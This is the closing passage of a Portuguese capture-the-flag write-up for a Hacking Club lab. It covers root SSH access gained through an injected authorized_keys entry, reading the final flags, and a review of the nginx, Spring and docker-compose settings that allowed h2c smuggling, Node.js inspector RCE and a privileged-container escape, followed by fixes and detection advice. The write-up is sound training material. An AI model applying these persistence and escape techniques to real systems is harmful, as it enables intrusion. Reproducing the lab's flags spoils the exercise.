Uma vez que nossa chave pública está no arquivo `authorized_keys` do root, o sistema SSH reconhece nossa chave privada como autorizada. Isso significa que podemos nos conectar como root sem precisar de senha, e a conexão permanece válida até que alguém remova nossa chave do arquivo.

Essa técnica é muito usada por atacantes para manter acesso persistente a sistemas comprometidos, pois:

- É discreta (não aparece em logs de login como tentativas de senha)
- Funciona mesmo se senhas forem alteradas
- Permite acesso direto sem precisar repetir toda a exploração

**Acesso SSH direto ao host:**

```bash
matheus@laidler~/tunnel$ sudo ssh -i rsa root@172.16.3.113
#> yes
#...
root@ip-172-16-3-113~#
#pronto, entramos na máquina host como root direto.
```

✅ **Root no host**  
✅ **Comprometimento total**

## 14. Capturando a flag final

Agora que temos acesso completo ao sistema, chegou a hora de pegar a segunda flag. Podemos fazer isso de duas formas: através da partição montada no container ou diretamente via SSH.

**Via partição montada (dentro do container):**

```bash
cd /mnt/root 
ls -la
cat root.txt
```

**Via host principal (SSH como root):**
```bash
root@ip-172-16-3-113~# ls -la
root@ip-172-16-3-113~# cat root.txt
```

**🚩 SEGUNDA FLAG ENCONTRADA:**

```text
hackingclub{d349c11e22a06b34d04e58***************6a0d302}
```

## 15. Investigando como tudo funcionou

Agora que temos controle total do sistema, vale a pena dar uma olhada "por trás das cortinas" para entender exatamente como as configurações permitiram nossa exploração. Isso vai nos ajudar a entender melhor as falhas de segurança e como corrigi-las.

Quando listamos o diretório root, vemos uma pasta `stack` - provavelmente onde estão os arquivos de configuração da aplicação:

```bash 
ls -la
cd stack
ls
```

### 15.1 Examinando o docker-compose.yml

Dentro da pasta stack vemos vários arquivos interessantes. O mais importante é o `docker-compose.yml`, que nos mostra exatamente como toda a aplicação foi estruturada:

```bash
ls
# Dockerfile.proxy  Dockerfile.spring  app  conf  docker-compose.yaml  spring
```

Vamos olhar o arquivo principal de orquestração para entender a arquitetura:

```bash
cat docker-compose.yaml 
```

```yaml
version: "3"
services:
  backend:
    restart: always
    build:
      context: .
      dockerfile: Dockerfile.spring
    environment:
      - SPRING_PROFILES_ACTIVE=prod
      - FLAG="hackingclub{c71b3ebb3e********************9a3f}"
      - NODE_DEBUG_HOST="http://internal:8000/"
      - NODE_DEBUG_PATH="/admin/internal-web-socket-endpoint"
  proxy:
    restart: always 
    build:
      context: .
      dockerfile: Dockerfile.proxy
    ports:
      - "8000:80"
    depends_on:
      - backend
      - internal
    links:
      - backend
      - internal
  internal:
    restart: always   
    image: node
    user: "root"
    command: "node --inspect=0.0.0.0:8000 /app/server.js"
    volumes:
      - ./app:/app
    privileged: true

```

```bash
cd conf
ls
cat nginx.conf

```
```conf
server {
    listen       80 default_server;
    server_name  localhost;

    location / {
     proxy_pass http://backend:8080;
     proxy_http_version 1.1;
     proxy_set_header Upgrade $http_upgrade;
     proxy_set_header Connection $http_connection;
    }

    location /actuator {
    deny all;
    }

    location /admin/internal-web-socket-endpoint/ {
        proxy_pass http://internal:8000/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $http_connection;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

}

```

**Analisando o que descobrimos:**

Agora fica tudo claro! O docker-compose revela exatamente como conseguimos explorar o sistema:

1. **Backend (Spring Boot):** Tem a primeira flag nas variáveis de ambiente e configurações que apontam para o node debug
2. **Proxy (Nginx):** Faz o roteamento mas permitiu o h2c smuggling
3. **Internal (Node.js):** O ponto crítico - rodando como root, privileged, e com `--inspect` habilitado

A linha mais perigosa é definitivamente `privileged: true` no container internal. Isso foi o que permitiu nosso Docker escape.

### 15.2 Conferindo a configuração do Nginx

Agora vamos verificar exatamente como o Nginx estava configurado para entender melhor o bypass:

```bash
cd conf
cat nginx.conf
```

**Aqui vemos a configuração que permitiu nossa exploração:**

```nginx
location / {
    proxy_pass http://backend:8080;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;      # ← Problema aqui!
    proxy_set_header Connection $http_connection; # ← E aqui também!
}

location /actuator {
    deny all;  # ← Bloqueado pelo Nginx, mas bypassamos via h2c
}
```

**O problema estava nas linhas do Upgrade:** O Nginx estava repassando os headers `Upgrade` e `Connection` sem validar adequadamente. Isso permitiu que nosso upgrade para h2c passasse direto para o backend Spring Boot.

### 15.3 Confirmando o suporte a HTTP/2 no Spring

Para o h2c smuggling funcionar, o backend precisa suportar HTTP/2. Vamos confirmar:

```bash
cd spring/spring/src/main/resources/
cat application.yaml
```

**Bingo! Encontramos a peça que faltava:**

```yaml
server:
  http2:
    enabled: true
```

**Agora tudo faz sentido!**

A cadeia de exploração funcionou porque:

1. **Nginx mal configurado:** Repassava headers `Upgrade` sem validação
2. **Spring Boot com HTTP/2:** Backend aceitava upgrade para h2c
3. **Container privilegiado:** Node.js rodando com privilégios de escape
4. **Debug habilitado:** `--inspect` exposto permitindo RCE

Cada falha individual já seria problemática, mas todas juntas criaram um caminho direto do browser até root no host. É um ótimo exemplo de como problemas de configuração podem se acumular criando vulnerabilidades críticas.

## 16. Lições aprendidas e como se proteger

### 16.1 Como conseguimos quebrar tudo

Nossa exploração funcionou porque encontramos uma "tempestade perfeita" de configurações problemáticas:

1. **Enumeração** → Spring Boot exposto com endpoints padrão
2. **h2c Smuggling** → Nginx repassando headers `Upgrade` sem validação
3. **Information Disclosure** → Actuator com variáveis de ambiente sensíveis
4. **RCE via CDP** → Node.js debug exposto publicamente
5. **Container Escape** → Container privilegiado permitindo mount do host
6. **Persistence** → SSH keys injection para manter acesso

O problema não foi uma vulnerabilidade específica, mas sim várias configurações inseguras que se somaram.

### 16.2 Correções essenciais

Baseado nos arquivos que encontramos na seção 15, aqui estão as correções que teriam impedido nosso ataque:

#### 1. Nginx - O grande vilão do h2c bypass

O problema principal estava na configuração do Nginx que repassava cegamente os headers `Upgrade` e `Connection`. Vimos isso no arquivo nginx.conf original:

```nginx
proxy_set_header Upgrade $http_upgrade;      # ← Perigoso!
proxy_set_header Connection $http_connection; # ← Permitiu h2c!
```

A correção seria simples: bloquear explicitamente tentativas de upgrade para h2c e limpar esses headers por padrão. Algo assim resolveria:

```nginx
# Rejeitar qualquer tentativa de h2c smuggling
if ($http_upgrade ~* "h2c") {
    return 400;
}
# Não repassar headers perigosos por padrão
proxy_set_header Upgrade "";
proxy_set_header Connection "";
```

#### 2. Spring Boot Actuator - Endpoints críticos expostos

O Actuator estava expondo informações sensíveis (como a primeira flag nas variáveis de ambiente). O ideal seria:

- **Isolar completamente:** Colocar em porta administrativa separada que não passa pelo proxy
- **Restringir acesso:** Bind apenas em localhost ao invés de aceitar conexões externas `management.server.address=127.0.0.1`
- **Expor apenas o essencial:** Só endpoints como `/health` que não vazam dados sensíveis `management.endpoints.web.exposure.include=health`

Assim o h2c bypass não teria conseguido acessar nada crítico.

#### 3. Node.js Debug - RCE direto

Descobrimos no docker-compose que o Node estava rodando com `--inspect=0.0.0.0:8000`, expondo o debugging para qualquer IP. Isso é suicide em produção.

- Se necessário, bind em localhost: `--inspect=127.0.0.1:9229`

A correção óbvia  `NODE_ENV=development`: debug só em desenvolvimento e sempre em localhost. Se precisar debuggar remotamente em produção (não recomendado), usar túnel SSH ao invés de expor diretamente.

#### 4. Docker - A falha que quebrou tudo

A linha `privileged: true` no container foi o que permitiu nosso escape total. Container privilegiado é basicamente dar as chaves do reino.

As correções básicas que teriam impedido o escape:

- Remover `privileged: true`
- Rodar como usuário não-root (`user: "1000:1000"`)
- Filesystem read-only para impedir modificações
- Drop de capabilities desnecessárias

Cada uma dessas falhas sozinha já seria ruim, mas juntas criaram um caminho direto do browser até root no host.

```yaml
# NUNCA em produção usar true:
privileged: false  # Pode até remover completamente esta linha, sério...

# Usar hardening básico:
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
user: "1000:1000"  # usuário não-root
read_only: true    # filesystem imutável
```

### 16.3 Detecção e monitoramento

Para detectar tentativas similares:

- **Logs do Nginx:** Monitorar headers `Upgrade: h2c`
- **Spring Boot:** Alertas em acessos a `/actuator/*`
- **Docker:** Logs de operações de mount em containers
- **Node.js:** Detecção de `inspector.open()` em produção

### 16.4 O que aprendemos

Esta máquina mostra perfeitamente como **defense in depth** é crucial. Cada falha individual poderia ter sido mitigada:

- Se o Nginx bloqueasse h2c → sem bypass do Actuator
- Se o Actuator estivesse em localhost → sem descoberta de endpoints
- Se o debug Node.js estivesse desabilitado → sem RCE
- Se o container não fosse privilegiado → sem escape

Mas como todas estavam presentes, criaram um caminho direto para comprometimento total. É um ótimo lembrete de que segurança não é sobre uma configuração perfeita, mas sobre várias camadas que se protegem mutuamente.

---

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/31368014-08f4-4943-a1d6-521341f4c673" />


**Flags capturadas:**

1. `hackingclub{c71b3ebb3e25f3c8304d90***************309a3f}` (via /actuator/env)  
2. `hackingclub{d349c11e22a06b34d04e58***************6a0d302}` (via Docker escape)

**Tópicos reconhecidos neste cenário:**

- HTTP/2 Cleartext Smuggling / Proxy Request Smuggling / H2C Upgrade Abuse
- Information Disclosure / Spring Boot Actuator enumeration / Attack Surface Mapping
- CDP WebSocket Debug Port RCE / Chrome DevTools Protocol RCE / CDP Remote Code Execution
- Privileged Container Escape / Container Breakout via Host Filesystem Mount / Rootfs Access
- SSH Authorized Keys Injection / SSH Key Injection Persistence / Privilege Escalation & Host Persistence

### Referências Principais

- [Hacktricks](https://book.hacktricks.wiki/pt/index.html)
- [BishopFox](https://bishopfox.com/)
- [Crowsec](https://blog.crowsec.com.br/)
- [Chrome DevTools](https://chromedevtools.github.io/)
- [Hacking Club](https://app.hackingclub.com/training/training-machines/176)

### Referências Adicionais

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Nginx Security Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [Spring Boot Security](https://spring.io/projects/spring-security)
- [Node.js Security Checklist](https://blog.risingstack.com/node-js-security-checklist/)
- [Container Security Guide](https://kubernetes.io/docs/concepts/security/)

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/f0667214-3a4e-4ad9-b792-0d97287fb8ca" />

**Nota: Mantive apenas visivel em foto uma flag (primeira) para te fazer praticar. Em vídeo temos resolução do exercício com as flags, mas ainda é preferível que faça você mesmo, nunca esquecer. Assistir é algo passivo, em hacking só aprendemos mesmo quanto somos ativo.**

#### Áudio Visual: Resolução gravada em vídeo

<iframe width="560" height="315" src="https://www.youtube.com/embed/Ew0WCkQvJl4?si=5pymaXYW5QR_xNGo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

 - Problema com o vídeo? então clique [aqui](https://youtu.be/Ew0WCkQvJl4) para ver diretamente do youtube.